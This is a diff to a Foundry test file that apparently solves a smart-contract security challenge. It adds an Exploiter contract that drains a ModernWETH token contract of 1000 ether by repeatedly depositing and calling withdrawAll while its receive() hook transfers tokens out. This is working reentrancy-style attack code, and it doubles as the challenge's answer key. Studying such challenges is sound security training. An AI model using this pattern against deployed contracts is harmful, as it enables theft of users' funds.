@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";
 
 /*////////////////////////////////////////////////////////////
@@ -9,7 +10,38 @@ import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
+contract Exploiter {
+    address public whitehat;
+    ModernWETH public modernWETH;
+    bool private _exploitStarted;
 
+    constructor(address _whitehat, address _modernWETH) {
+        whitehat = _whitehat;
+        modernWETH = ModernWETH(_modernWETH);
+    }
+
+    function exploit() public {
+        _exploitStarted = true;
+
+        while (modernWETH.balanceOf(whitehat) < 1000 ether) {
+            modernWETH.deposit{value: 10 ether}();
+            modernWETH.withdrawAll();
+        }
+        // send back the hack funds
+        payable(whitehat).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        if (!_exploitStarted) {
+            return;
+        }
+
+        modernWETH.transfer(
+            address(whitehat),
+            modernWETH.balanceOf(address(this))
+        );
+    }
+}
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -40,13 +72,27 @@ contract Challenge2Test is Test {
         // forge test --match-contract Challenge2Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        Exploiter ctr = new Exploiter(whitehat, address(modernWETH));
 
+        payable(address(ctr)).transfer(10 ether);
+        ctr.exploit();
+
+        // exchange mWETH amount for ETH
+        modernWETH.withdrawAll();
 
         //==================================================//
         vm.stopPrank();
 
-        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
+        assertEq(
+            address(modernWETH).balance,
+            0,
+            "ModernWETH balance should be 0"
+        );
         // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
-        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
+        assertEq(
+            address(whitehat).balance,
+            1010 ether,
+            "whitehat should end with 1010 ether"
+        );
     }
 }
